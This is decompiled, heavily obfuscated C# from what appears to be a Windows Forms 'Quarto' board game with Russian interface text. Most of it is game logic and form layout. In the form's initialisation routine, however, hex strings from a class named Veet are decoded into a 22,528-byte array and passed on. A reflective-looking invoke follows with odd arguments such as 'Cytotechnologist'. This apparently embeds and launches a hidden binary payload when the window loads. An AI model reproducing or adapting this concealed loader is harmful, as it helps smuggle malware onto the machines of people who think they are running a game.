				}
				case 54u:
					num++;
					num2 = ((int)num3 * -1030316735) ^ 0x7650AB91;
					continue;
				case 53u:
					if (mem[0, 3] != null)
					{
						num2 = 1578331304;
						continue;
					}
					goto IL_0156;
				case 52u:
				{
					int num31;
					int num32;
					if (mem[2, 2] != null)
					{
						num31 = 1735955849;
						num32 = 1735955849;
					}
					else
					{
						num31 = 685174385;
						num32 = 685174385;
					}
					num2 = num31 ^ ((int)num3 * -1463635037);
					continue;
				}
				case 51u:
				{
					int num25;
					int num26;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num25 = -1440896150;
						num26 = -1440896150;
					}
					else
					{
						num25 = -1189706130;
						num26 = -1189706130;
					}
					num2 = num25 ^ (int)(num3 * 1576157670);
					continue;
				}
				case 50u:
				{
					int num16;
					int num17;
					if (!flag2)
					{
						num16 = -1748678392;
						num17 = -1748678392;
					}
					else
					{
						num16 = -888358634;
						num17 = -888358634;
					}
					num2 = num16 ^ (int)(num3 * 904259107);
					continue;
				}
				case 49u:
					if (mem[num, 2].Big != mem[num, 3].Big)
					{
						num2 = ((int)num3 * -745503303) ^ 0x40E99AF9;
						continue;
					}
					goto IL_0225;
				case 48u:
				{
					int num73;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num2 = 1905758220;
						num73 = 1905758220;
					}
					else
					{
						num2 = 1414773590;
						num73 = 1414773590;
					}
					continue;
				}
				case 47u:
				{
					int num70;
					int num71;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num70 = 397371281;
						num71 = 397371281;
					}
					else
					{
						num70 = 1209193686;
						num71 = 1209193686;
					}
					num2 = num70 ^ (int)(num3 * 479987904);
					continue;
				}
				case 46u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num2 = (int)((num3 * 1567343973) ^ 0x5BA094AF);
						continue;
					}
					goto IL_0567;
				case 45u:
				{
					int num58;
					int num59;
					if (mem[num, 3] == null)
					{
						num58 = -979625656;
						num59 = -979625656;
					}
					else
					{
						num58 = -1063346360;
						num59 = -1063346360;
					}
					num2 = num58 ^ (int)(num3 * 742457138);
					continue;
				}
				case 44u:
				{
					int num55;
					if (mem[num, 0].Point == mem[num, 1].Point)
					{
						num2 = 942829843;
						num55 = 942829843;
					}
					else
					{
						num2 = 893139738;
						num55 = 893139738;
					}
					continue;
				}
				case 43u:
				{
					int num50;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num2 = 162351004;
						num50 = 162351004;
					}
					else
					{
						num2 = 741734748;
						num50 = 741734748;
					}
					continue;
				}
				case 42u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num2 = (int)((num3 * 938616865) ^ 0x1190F22);
						continue;
					}
					goto IL_063b;
				case 41u:
				{
					int num42;
					int num43;
					if (mem[1, 1] == null)
					{
						num42 = 2048363716;
						num43 = 2048363716;
					}
					else
					{
						num42 = 1499564091;
						num43 = 1499564091;
					}
					num2 = num42 ^ ((int)num3 * -1322774251);
					continue;
				}
				case 40u:
				{
					int num39;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num2 = 920548138;
						num39 = 920548138;
					}
					else
					{
						num2 = 84609997;
						num39 = 84609997;
					}
					continue;
				}
				case 39u:
				{
					int num35;
					int num36;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num35 = 1705337540;
						num36 = 1705337540;
					}
					else
					{
						num35 = 415865306;
						num36 = 415865306;
					}
					num2 = num35 ^ (int)(num3 * 447661134);
					continue;
				}
				case 38u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num2 = ((int)num3 * -469272474) ^ 0x7732CE1D;
						continue;
					}
					goto IL_063b;
				case 37u:
				{
					int num27;
					int num28;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num27 = 61636841;
						num28 = 61636841;
					}
					else
					{
						num27 = 328629274;
						num28 = 328629274;
					}
					num2 = num27 ^ ((int)num3 * -1436877386);
					continue;
				}
				case 36u:
				{
					int num20;
					int num21;
					if (mem[3, 3] == null)
					{
						num20 = 222178477;
						num21 = 222178477;
					}
					else
					{
						num20 = 1303952379;
						num21 = 1303952379;
					}
					num2 = num20 ^ (int)(num3 * 797763360);
					continue;
				}
				case 35u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num2 = ((int)num3 * -1277072388) ^ -648452257;
						continue;
					}
					goto IL_0567;
				case 34u:
				{
					int num12;
					int num13;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num12 = 2039747430;
						num13 = 2039747430;
					}
					else
					{
						num12 = 615523453;
						num13 = 615523453;
					}
					num2 = num12 ^ ((int)num3 * -80435497);
					continue;
				}
				case 33u:
				{
					int num6;
					int num7;
					if (mem[num, 0] != null)
					{
						num6 = 762863255;
						num7 = 762863255;
					}
					else
					{
						num6 = 1824532644;
						num7 = 1824532644;
					}
					num2 = num6 ^ ((int)num3 * -736530654);
					continue;
				}
				case 32u:
					if (mem[2, 1] != null)
					{
						num2 = (int)((num3 * 2111759519) ^ 0x5C32DABD);
						continue;
					}
					goto IL_0156;
				case 31u:
				{
					int num72;
					if (mem[num, 0].Dark != mem[num, 1].Dark)
					{
						num2 = 2146857039;
						num72 = 2146857039;
					}
					else
					{
						num2 = 1690377693;
						num72 = 1690377693;
					}
					continue;
				}
				case 30u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num2 = (int)(num3 * 803707564) ^ -202801264;
						continue;
					}
					goto IL_063b;
				case 29u:
					if (mem[3, 0] != null)
					{
						num2 = ((int)num3 * -1022100333) ^ 0xCEF6C9D;
						continue;
					}
					goto IL_0156;
				case 28u:
				{
					int num68;
					int num69;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num68 = 1914105972;
						num69 = 1914105972;
					}
					else
					{
						num68 = 1224151495;
						num69 = 1224151495;
					}
					num2 = num68 ^ ((int)num3 * -11862780);
					continue;
				}
				case 27u:
					num2 = 758651815;
					continue;
				case 26u:
				{
					int num62;
					int num63;
					if (mem[1, num].Big != mem[2, num].Big)
					{
						num62 = 652012611;
						num63 = 652012611;
					}
					else
					{
						num62 = 238680116;
						num63 = 238680116;
					}
					num2 = num62 ^ ((int)num3 * -1051185623);
					continue;
				}
				case 25u:
				{
					int num56;
					int num57;
					if (mem[1, num].Point == mem[2, num].Point)
					{
						num56 = 801312465;
						num57 = 801312465;
					}
					else
					{
						num56 = 1381437326;
						num57 = 1381437326;
					}
					num2 = num56 ^ (int)(num3 * 150818922);
					continue;
				}
				case 24u:
				{
					int num53;
					int num54;
					if (mem[num, 0].Big == mem[num, 1].Big)
					{
						num53 = -1251465148;
						num54 = -1251465148;
					}
					else
					{
						num53 = -320473861;
						num54 = -320473861;
					}
					num2 = num53 ^ (int)(num3 * 422693234);
					continue;
				}
				case 23u:
					if (mem[2, num] != null)
					{
						num2 = ((int)num3 * -570570303) ^ 0x1BB48152;
						continue;
					}
					goto IL_01f0;
				case 22u:
				{
					int num48;
					int num49;
					if (mem[num, 1] != null)
					{
						num48 = 1715541727;
						num49 = 1715541727;
					}
					else
					{
						num48 = 478270005;
						num49 = 478270005;
					}
					num2 = num48 ^ ((int)num3 * -334724383);
					continue;
				}
				case 21u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num2 = ((int)num3 * -219475868) ^ 0x2268E647;
						continue;
					}
					goto IL_0567;
				case 20u:
					num10 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0157;
				case 19u:
				{
					int num44;
					int num45;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num44 = -1418907298;
						num45 = -1418907298;
					}
					else
					{
						num44 = -628038707;
						num45 = -628038707;
					}
					num2 = num44 ^ (int)(num3 * 963476992);
					continue;
				}
				case 18u:
					if (mem[num, 2].Point != mem[num, 3].Point)
					{
						num2 = (int)(num3 * 1933172486) ^ -1985178092;
						continue;
					}
					goto IL_0225;
				case 17u:
					num2 = 175530381;
					continue;
				case 16u:
					if (mem[2, num].Point != mem[3, num].Point)
					{
						num2 = ((int)num3 * -1471668663) ^ -750498015;
						continue;
					}
					goto IL_0286;
				case 15u:
					if (mem[2, num].Big != mem[3, num].Big)
					{
						num2 = ((int)num3 * -813097996) ^ 0x10A29E99;
						continue;
					}
					goto IL_0286;
				case 14u:
				{
					int num37;
					int num38;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num37 = -420788370;
						num38 = -420788370;
					}
					else
					{
						num37 = -273346749;
						num38 = -273346749;
					}
					num2 = num37 ^ ((int)num3 * -1397692070);
					continue;
				}
				case 13u:
				{
					int num33;
					int num34;
					if (mem[num, 1].Point != mem[num, 2].Point)
					{
						num33 = -1750907034;
						num34 = -1750907034;
					}
					else
					{
						num33 = -2133613065;
						num34 = -2133613065;
					}
					num2 = num33 ^ ((int)num3 * -2146339316);
					continue;
				}
				case 12u:
					num2 = 796345045;
					continue;
				case 10u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num2 = ((int)num3 * -1194394655) ^ 0x72352E01;
						continue;
					}
					goto IL_063b;
				case 9u:
				{
					int num29;
					int num30;
					if (!flag4)
					{
						num29 = -847413867;
						num30 = -847413867;
					}
					else
					{
						num29 = -166336782;
						num30 = -166336782;
					}
					num2 = num29 ^ (int)(num3 * 427670633);
					continue;
				}
				case 8u:
				{
					int num24;
					if (mem[0, num].Dark == mem[1, num].Dark)
					{
						num2 = 1342906196;
						num24 = 1342906196;
					}
					else
					{
						num2 = 1952186973;
						num24 = 1952186973;
					}
					continue;
				}
				case 7u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num2 = ((int)num3 * -1329567071) ^ -455363030;
						continue;
					}
					goto IL_0251;
				case 6u:
					num11 = ((mem[2, num].Square == mem[3, num].Square) ? 1 : 0);
					goto IL_0030;
				case 5u:
				{
					int num19;
					if (mem[0, num].Point == mem[1, num].Point)
					{
						num2 = 1643789764;
						num19 = 1643789764;
					}
					else
					{
						num2 = 1008586778;
						num19 = 1008586778;
					}
					continue;
				}
				case 4u:
				{
					int num18;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num2 = 1067090159;
						num18 = 1067090159;
					}
					else
					{
						num2 = 2022348767;
						num18 = 2022348767;
					}
					continue;
				}
				case 3u:
				{
					int num14;
					int num15;
					if (flag3)
					{
						num14 = 755468807;
						num15 = 755468807;
					}
					else
					{
						num14 = 417804817;
						num15 = 417804817;
					}
					num2 = num14 ^ (int)(num3 * 477665582);
					continue;
				}
				case 2u:
					if (mem[0, num] != null)
					{
						num2 = 788909070;
						continue;
					}
					goto IL_01f0;
				case 1u:
				{
					int num8;
					int num9;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num8 = 545928365;
						num9 = 545928365;
					}
					else
					{
						num8 = 915919241;
						num9 = 915919241;
					}
					num2 = num8 ^ (int)(num3 * 666886258);
					continue;
				}
				case 0u:
				{
					int num4;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num2 = 1695759707;
						num4 = 1695759707;
					}
					else
					{
						num2 = 1017458723;
						num4 = 1017458723;
					}
					continue;
				}
				case 76u:
					break;
				default:
					{
						return result;
					}
					IL_0156:
					num10 = 0;
					goto IL_0157;
					IL_002f:
					num11 = 0;
					goto IL_0030;
					IL_0286:
					num11 = 1;
					goto IL_0030;
					IL_0157:
					flag3 = (byte)num10 != 0;
					num2 = 1283060339;
					continue;
					IL_0251:
					num10 = 0;
					goto IL_0157;
					IL_0225:
					num11 = 1;
					goto IL_0030;
					IL_01f0:
					num11 = 0;
					goto IL_0030;
					IL_063b:
					num10 = 1;
					goto IL_0157;
					IL_0030:
					flag4 = (byte)num11 != 0;
					num2 = 992148581;
					continue;
					IL_0567:
					num10 = 1;
					goto IL_0157;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -992383923;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA046BB5Fu) % 12u)
				{
				case 11u:
				{
					int num6;
					if (mem[num3, num4] == null)
					{
						num = -1201941553;
						num6 = -1201941553;
					}
					else
					{
						num = -760164275;
						num6 = -760164275;
					}
					continue;
				}
				case 9u:
					num4 = 0;
					num = -181586744;
					continue;
				case 8u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1423347346;
						num8 = -1423347346;
					}
					else
					{
						num7 = -431596646;
						num8 = -431596646;
					}
					num = num7 ^ ((int)num2 * -1610291617);
					continue;
				}
				case 7u:
					num3++;
					num = (int)((num2 * 1212640165) ^ 0x1B1BBAE4);
					continue;
				case 6u:
					flag2 = true;
					num3 = 0;
					num = ((int)num2 * -1146229338) ^ 0x1DECEA27;
					continue;
				case 4u:
					flag2 = false;
					num = ((int)num2 * -238380567) ^ 0x4552EB5D;
					continue;
				case 3u:
				{
					int num5;
					if (num4 < 4)
					{
						num = -1069801444;
						num5 = -1069801444;
					}
					else
					{
						num = -1610315300;
						num5 = -1610315300;
					}
					continue;
				}
				case 2u:
					num4++;
					num = -181586744;
					continue;
				case 1u:
					result = flag2;
					num = (int)(num2 * 1707584634) ^ -855976821;
					continue;
				case 0u:
					flag = num3 < 4;
					num = -715721089;
					continue;
				case 5u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = -1222873786;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x94505EC3u) % 8u)
				{
				case 7u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -234936368) ^ -1006814365;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -324792780) ^ 0x72ACFB35;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label1, "");
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)((num2 * 1352596455) ^ 0x490AF58F);
					continue;
				case 2u:
					num = ((int)num2 * -1906029877) ^ 0x8166C2A;
					continue;
				case 1u:
					num = ((int)num2 * -623692797) ^ 0x96DA07E;
					continue;
				case 0u:
					num = ((int)num2 * -397934394) ^ 0x7C8FDC28;
					continue;
				default:
					return;
				case 4u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0016;
		}
		goto IL_0086;
		IL_0016:
		int num = -543240125;
		goto IL_0052;
		IL_0052:
		int num3;
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0xB39FAD52u) % 6u)
			{
			case 4u:
				break;
			case 3u:
				((Form)this).Dispose(disposing);
				num = -889733333;
				continue;
			case 2u:
				num = (int)((num2 * 1307916839) ^ 0x56B413CD);
				continue;
			case 0u:
				Form1.smethod_51((IDisposable)components);
				num = (int)(num2 * 2029219646) ^ -1497842256;
				continue;
			default:
				return;
			case 5u:
				goto IL_007b;
			case 1u:
				return;
			}
			break;
			IL_007b:
			if (components != null)
			{
				num = -852969874;
				num3 = -852969874;
				continue;
			}
			goto IL_0086;
		}
		goto IL_0016;
		IL_0086:
		num = -1395688469;
		num3 = -1395688469;
		goto IL_0052;
	}

	private void InitializeComponent()
	{
		//IL_0ee7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ef1: Expected O, but got Unknown
		components = Form1.smethod_52();
		string sa = default(string);
		byte[] array = default(byte[]);
		int num3 = default(int);
		object[] object_ = default(object[]);
		bool flag = default(bool);
		while (true)
		{
			int num = -630980849;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9BFBB088u) % 121u)
				{
				case 120u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)((num2 * 765436934) ^ 0x73920D96);
					continue;
				case 119u:
					sa = Veet.Sa;
					sa = Form1.smethod_34(sa, Veet.Xe);
					sa = Form1.smethod_34(sa, Veet.Zr);
					num = (int)(num2 * 1274521610) ^ -245105663;
					continue;
				case 118u:
					array = new byte[22528];
					num3 = 0;
					num = (int)(num2 * 1054792250) ^ -196314532;
					continue;
				case 117u:
					num = (int)((num2 * 1056104866) ^ 0x77E45116);
					continue;
				case 116u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)((num2 * 1236510786) ^ 0x4D450EEE);
					continue;
				case 115u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(sa, num3 * 2, 2), 16);
					num = -844539631;
					continue;
				case 114u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -448952704) ^ 0x3B6D5CAD;
					continue;
				case 113u:
					num = ((int)num2 * -693708582) ^ -833479940;
					continue;
				case 112u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1365084334) ^ 0x3B5D92EC;
					continue;
				case 111u:
					Form1.smethod_61((Control)(object)button2, "button2");
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -490019999) ^ 0x7673D43;
					continue;
				case 110u:
					Form1.smethod_59((Control)(object)this);
					num = (int)((num2 * 1322491792) ^ 0x4D5BCD8D);
					continue;
				case 109u:
					num = (int)(num2 * 1439514287) ^ -1107991012;
					continue;
				case 108u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -418443617) ^ 0x666EC59B;
					continue;
				case 107u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 896715668) ^ 0xA104186);
					continue;
				case 106u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -334718264) ^ 0x35ABFD20;
					continue;
				case 105u:
					panel1 = Form1.smethod_55();
					num = (int)(num2 * 971781414) ^ -1627106622;
					continue;
				case 104u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1977874307) ^ -557616048;
					continue;
				case 103u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -269722606) ^ 0x5CB05D84;
					continue;
				case 102u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -1640194035) ^ 0xB9F916E;
					continue;
				case 101u:
					timer1 = Form1.smethod_56(components);
					num = (int)((num2 * 2135402910) ^ 0x2CC35EB2);
					continue;
				case 100u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -87547383) ^ -1003420512;
					continue;
				case 99u:
					num = ((int)num2 * -292782202) ^ 0x742086FC;
					continue;
				case 98u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -1043067399) ^ 0x5BDECD78;
					continue;
				case 97u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -909836529) ^ 0x5FA252DD;
					continue;
				case 96u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -848103458) ^ 0x5625D60C;
					continue;
				case 95u:
					num = (int)(num2 * 1625673524) ^ -997977540;
					continue;
				case 94u:
					num = ((int)num2 * -36159497) ^ -1526804181;
					continue;
				case 93u:
					num = (int)((num2 * 793083944) ^ 0x75EBCC50);
					continue;
				case 92u:
					num = (int)(num2 * 1417873267) ^ -664801196;
					continue;
				case 91u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 2073941796) ^ -654813789;
					continue;
				case 90u:
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -54365877) ^ 0x6743B33B;
					continue;
				case 89u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -2038967959) ^ 0x1AF5D004;
					continue;
				case 88u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1900876665) ^ -2023381983;
					continue;
				case 87u:
					num = (int)(num2 * 2140288142) ^ -2058647067;
					continue;
				case 86u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -1380173782) ^ 0x12921C9B;
					continue;
				case 85u:
					num = ((int)num2 * -1913978612) ^ 0xFED8490;
					continue;
				case 84u:
					flag = num3 < 22528;
					num = -617373283;
					continue;
				case 83u:
					num = ((int)num2 * -1971755444) ^ 0x1EAE15EF;
					continue;
				case 82u:
					num = (int)((num2 * 1674127575) ^ 0x5BF4FB38);
					continue;
				case 81u:
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1509255487) ^ 0x112B07D2;
					continue;
				case 80u:
					num = (int)(num2 * 600519016) ^ -1817673252;
					continue;
				case 79u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1113025497) ^ 0x33C5926A;
					continue;
				case 78u:
					num = (int)(num2 * 62306518) ^ -395857764;
					continue;
				case 77u:
					num = (int)(num2 * 187339410) ^ -1581123743;
					continue;
				case 76u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 1077448412) ^ 0x53A0B0D5);
					continue;
				case 75u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -1940621826) ^ -876303632;
					continue;
				case 74u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 1792332954) ^ 0x5F99B034);
					continue;
				case 73u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -468837949) ^ 0x10F26DAF;
					continue;
				case 72u:
					num = (int)(num2 * 270054566) ^ -449033149;
					continue;
				case 71u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = (int)((num2 * 715904269) ^ 0x1BA42EC8);
					continue;
				case 70u:
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 1378070990) ^ 0x2B47E196);
					continue;
				case 69u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)(num2 * 1548005927) ^ -628530820;
					continue;
				case 68u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)((num2 * 1029848019) ^ 0x56A1033D);
					continue;
				case 67u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 858467467) ^ 0x4563BE72);
					continue;
				case 66u:
					num = (int)((num2 * 106364156) ^ 0x56B251EA);
					continue;
				case 65u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 173825641) ^ 0x4FD8EE2B);
					continue;
				case 64u:
					num = ((int)num2 * -1654250397) ^ -601080569;
					continue;
				case 63u:
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -1122595054) ^ -136324382;
					continue;
				case 62u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1205131085) ^ -2003121949;
					continue;
				case 61u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -1510592014) ^ -1714027640;
					continue;
				case 60u:
					num = ((int)num2 * -2122445402) ^ 0x5BD69F1A;
					continue;
				case 59u:
					CharArray(array, string.Empty);
					num = (int)((num2 * 1580282477) ^ 0x5106A6D6);
					continue;
				case 58u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -2087367667;
						num5 = -2087367667;
					}
					else
					{
						num4 = -1490627240;
						num5 = -1490627240;
					}
					num = num4 ^ ((int)num2 * -1278206882);
					continue;
				}
				case 57u:
					num = ((int)num2 * -1503127118) ^ -71849146;
					continue;
				case 56u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 684283755) ^ 0x447E941F);
					continue;
				case 55u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 907072829) ^ 0x73209C29);
					continue;
				case 54u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -521669405) ^ -448771359;
					continue;
				case 53u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1112920714) ^ -635924897;
					continue;
				case 52u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -491326527) ^ -1850458283;
					continue;
				case 51u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -373252960) ^ 0x16E46273;
					continue;
				case 50u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -129845797) ^ 0xCC808D7;
					continue;
				case 49u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -1720955554) ^ -263365996;
					continue;
				case 48u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -1873333948) ^ 0x1C47C43;
					continue;
				case 47u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -398999666) ^ 0x2BE0EFFB;
					continue;
				case 46u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 1055385919) ^ -1603556298;
					continue;
				case 45u:
					num = ((int)num2 * -806216856) ^ 0x783E5A3E;
					continue;
				case 44u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -1829853737) ^ 0x16E98281;
					continue;
				case 43u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)((num2 * 300637904) ^ 0x6B6AAF53);
					continue;
				case 42u:
					num = (int)((num2 * 889398632) ^ 0x2ACD4AFB);
					continue;
				case 41u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 464361972) ^ -651717005;
					continue;
				case 40u:
					num3++;
					num = (int)((num2 * 627954625) ^ 0x6E99F09F);
					continue;
				case 39u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -2147036864) ^ -2117065628;
					continue;
				case 38u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -1747776263) ^ -319823103;
					continue;
				case 37u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 992578820) ^ 0x4F8E1778);
					continue;
				case 35u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 1255503335) ^ -1880282701;
					continue;
				case 34u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -1401974795) ^ -1029036415;
					continue;
				case 33u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -2053215414) ^ 0x44C15FAF;
					continue;
				case 32u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -1555243335) ^ -941466283;
					continue;
				case 31u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -833398189) ^ -2092143216;
					continue;
				case 30u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -654414035) ^ -1433734114;
					continue;
				case 29u:
					num = (int)((num2 * 1598530781) ^ 0x12473260);
					continue;
				case 28u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)((num2 * 106445902) ^ 0x332D3F7A);
					continue;
				case 27u:
					num = (int)((num2 * 1589983642) ^ 0x19FB74A1);
					continue;
				case 26u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 1704037351) ^ -1209970460;
					continue;
				case 25u:
					num = (int)((num2 * 1033096792) ^ 0x619BE3C0);
					continue;
				case 23u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 1067639261) ^ -690441213;
					continue;
				case 22u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)(num2 * 1973271685) ^ -1555969088;
					continue;
				case 21u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)(num2 * 960251752) ^ -28581387;
					continue;
				case 20u:
					num = ((int)num2 * -2050578304) ^ -948731750;
					continue;
				case 19u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -1607514325) ^ -1261245935;
					continue;
				case 18u:
					num = (int)((num2 * 217196933) ^ 0x317FA034);
					continue;
				case 17u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 619172065) ^ 0x298F868E);
					continue;
				case 16u:
